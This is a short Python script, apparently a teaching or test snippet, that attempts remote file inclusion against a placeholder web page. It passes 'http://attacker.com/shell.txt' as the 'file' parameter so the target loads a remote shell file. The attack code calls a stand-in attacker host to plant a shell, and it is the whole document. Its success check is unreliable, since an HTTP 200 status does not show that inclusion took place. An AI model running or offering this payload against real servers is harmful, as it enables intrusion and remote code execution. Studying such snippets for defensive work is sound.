import requests

url = "http://IPAddress/page.php?file=file.txt"

# attempt to include a remote file
r = requests.get(url, params = {'file': 'http://attacker.com/shell.txt'})

# check if the request was successful
if r.status_code == 200:
    print("Remote file inclusion successful!")
else:
    print("Remote file inclusion failed.")
